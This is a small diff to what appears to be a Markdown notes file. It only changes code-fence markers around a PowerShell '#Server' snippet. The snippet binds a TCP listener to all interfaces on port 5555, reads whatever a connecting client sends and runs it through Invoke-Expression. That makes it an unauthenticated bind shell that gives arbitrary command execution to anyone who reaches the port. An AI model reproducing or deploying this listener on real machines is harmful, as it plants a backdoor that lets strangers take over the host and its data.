@@ -1,4 +1,4 @@
-'''PowerShell
+```PowerShell
 #Server
 $ip=[IPAddress]"0.0.0.0"
 $TcpListener=New-Object System.Net.Sockets.TcpListener (New-Object System.Net.IPEndPoint($ip,"5555"))
@@ -10,4 +10,4 @@ $mensaje=(New-Object System.IO.StreamReader ($TcpListener.AcceptTcpClient().GetS
 $mensaje | iex
 }
 $TcpListener.Stop()
-'''
+```
